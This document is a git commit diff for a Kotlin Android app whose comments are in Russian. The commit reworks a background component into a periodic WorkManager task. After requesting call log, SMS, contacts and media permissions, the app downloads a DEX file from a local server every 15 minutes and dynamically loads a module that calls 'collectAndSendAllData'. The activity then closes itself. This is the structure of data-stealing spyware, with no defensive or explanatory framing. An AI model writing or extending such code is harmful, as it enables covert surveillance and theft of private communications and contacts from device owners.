7f56b2936ec934b64a122a1e4ec4f7925728e157
Papa-Pedro-13 <62937441+Papa-Pedro-13@users.noreply.github.com>
2025-03-08 13:54:07 +0300

    finish

--- app/src/main/java/com/example/myapplication/CallLogService.kt
+++ app/src/main/java/com/example/myapplication/CallLogService.kt
@@ -1,37 +1,33 @@
 package com.example.myapplication.calllogservice
 
-import android.app.Service
+
 import android.content.Context
-import android.content.Intent
-import android.os.IBinder
 import android.util.Log
+import androidx.work.Worker
+import androidx.work.WorkerParameters
 import dalvik.system.DexClassLoader
 import java.io.File
-import java.io.FileInputStream
 import java.io.FileNotFoundException
-import java.io.FileOutputStream
 import java.io.IOException
-import java.net.HttpURLConnection
 import java.net.URL
 
-class CallLogService : Service() {
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Thread {
-            // Используем cacheDir вместо codeCacheDir
-            val dexPath = File(cacheDir, "calllogger.dex")
-            if (downloadDex(dexPath)) {
-                loadAndRunDex(dexPath)
-            }
-        }.start()
-        return START_STICKY
+class CallLogWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
+    override fun doWork(): Result {
+        Log.d("WORKER", "Запустился Worker")
+
+        val dexPath = File(applicationContext.cacheDir, "calllogger.dex")
+        if (downloadDex(dexPath)) {
+            loadAndRunDex(dexPath)
+        }
+        return Result.success()
     }
+
 
     private fun downloadDex(dexFile: File): Boolean {
         return try {
-            // Создаем директорию, если не существует
             dexFile.parentFile?.mkdirs()
 
-            val tempFile = File.createTempFile("temp_dex", ".dex", cacheDir)
+            val tempFile = File.createTempFile("temp_dex", ".dex", applicationContext.cacheDir)
             val url = URL("http://192.168.0.101:3000/get-latest-dex")
 
             url.openStream().use { input ->
@@ -40,14 +36,11 @@ class CallLogService : Service() {
                 }
             }
 
-            // Проверяем размер файла
             if (tempFile.length() == 0L) throw IOException("Empty DEX file")
 
-            // Копируем с заменой
             tempFile.copyTo(dexFile, overwrite = true)
             tempFile.delete()
 
-            // Устанавливаем права
             dexFile.setReadable(true, false)
             dexFile.setWritable(false, false)
             true
@@ -57,27 +50,25 @@ class CallLogService : Service() {
         }
     }
 
+
     private fun loadAndRunDex(dexFile: File) {
         try {
             if (!dexFile.exists()) throw FileNotFoundException("DEX not found")
 
-            // Используем getCodeCacheDir() для оптимизированного кода
-            val optimizedDir = codeCacheDir
+            val optimizedDir = applicationContext.codeCacheDir
 
             val classLoader = DexClassLoader(
                 dexFile.absolutePath,
                 optimizedDir.absolutePath,
                 null,
-                javaClass.classLoader // Используем правильный classLoader
+                javaClass.classLoader
             )
 
             val clazz = classLoader.loadClass("com.example.dexmodule.CallLoggerModule")
             val method = clazz.getMethod("collectAndSendAllData", Context::class.java)
-            method.invoke(clazz.getDeclaredConstructor().newInstance(), this)
+            method.invoke(clazz.getDeclaredConstructor().newInstance(), applicationContext)
         } catch (e: Exception) {
             Log.e("DEX_LOAD", "Error loading module", e)
         }
     }
-
-    override fun onBind(intent: Intent?): IBinder? = null
 }
--- app/src/main/java/com/example/myapplication/MainActivity.kt
+++ app/src/main/java/com/example/myapplication/MainActivity.kt
@@ -6,21 +6,28 @@ import android.os.Bundle
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
-import com.example.myapplication.calllogservice.CallLogService
 import android.Manifest
+import android.content.Context
+import android.os.Build
+import androidx.work.Constraints
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.OneTimeWorkRequestBuilder
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
+import com.example.myapplication.calllogservice.CallLogWorker
 import java.net.HttpURLConnection
 import java.net.URL
+import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
     // Регистрируем ActivityResultLauncher для запроса нескольких разрешений
     private val requestPermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
-        // Проверяем, все ли разрешения предоставлены
-        if (permissions.all { it.value }) {
-            startCallLogService()
-        } else {
 
+        if (permissions.all { it.value }) {
+            startCallLogWorker()
+        } else {
             finish()
         }
     }
@@ -31,8 +38,7 @@ class MainActivity : AppCompatActivity() {
         // Список необходимых разрешений
         val requiredPermissions = arrayOf(
             Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
+
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_MEDIA_IMAGES,
@@ -41,18 +47,40 @@ class MainActivity : AppCompatActivity() {
         )
 
         // Проверяем, есть ли уже все разрешения
-        if (!requiredPermissions.all {
+        if (requiredPermissions.all {
                 ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
             }) {
+            startCallLogWorker()
+        } else {
             requestPermissionsLauncher.launch(requiredPermissions)
         }
-        startCallLogService()
-        // Закрываем активность после запуска сервиса
-        finish()
+
     }
 
-    private fun startCallLogService() {
-        val intent = Intent(this, CallLogService::class.java)
-        startService(intent)
+
+    private fun startCallLogWorker() {
+        val workRequest = PeriodicWorkRequestBuilder<CallLogWorker>(15, TimeUnit.MINUTES)
+            .setConstraints(
+                Constraints.Builder()
+                    .setRequiresBatteryNotLow(true)
+                    .build()
+            )
+            .build()
+
+
+//        val oneTimeWorkRequest = OneTimeWorkRequestBuilder<CallLogWorker>()
+//            .setInitialDelay(0, TimeUnit.SECONDS)
+//            .build()
+//
+//        WorkManager.getInstance(this).enqueue(oneTimeWorkRequest)
+
+
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "CallLogWork",
+            ExistingPeriodicWorkPolicy.REPLACE,
+            workRequest
+        )
+
+        finish()
     }
 }
